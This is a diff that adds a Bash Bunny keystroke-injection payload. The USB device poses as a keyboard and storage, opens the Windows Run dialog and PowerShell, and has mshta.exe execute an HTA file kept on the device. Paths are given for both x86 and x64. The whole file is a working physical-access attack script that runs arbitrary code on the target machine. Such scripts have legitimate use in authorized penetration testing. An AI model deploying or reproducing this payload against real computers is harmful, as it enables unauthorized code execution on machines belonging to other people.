@@ -1,0 +1,28 @@
+LED W TRIPLE
+
+ATTACKMODE HID STORAGE
+
+DRIVER_LABEL='BashBunny'
+GET SWITCH_POSITION
+
+Q GUI r
+Q DELAY 300
+Q STRING powershell  
+Q ENTER
+
+Q DELAY 2000
+
+#x86
+Q STRING "C:\Windows\SysWOW64\mshta.exe ((gwmi win32_volume -f 'label=''$DRIVER_LABEL''').Name+'payloads\\$SWITCH_POSITION\payload.hta')"
+
+#x64
+Q STRING "C:\Windows\System32\\mshta.exe ((gwmi win32_volume -f 'label=''$DRIVER_LABEL''').Name+'payloads\\$SWITCH_POSITION\payload.hta')"
+
+Q ENTER
+Q STRING exit
+Q ENTER
+
+LED FINISH
+
+
+
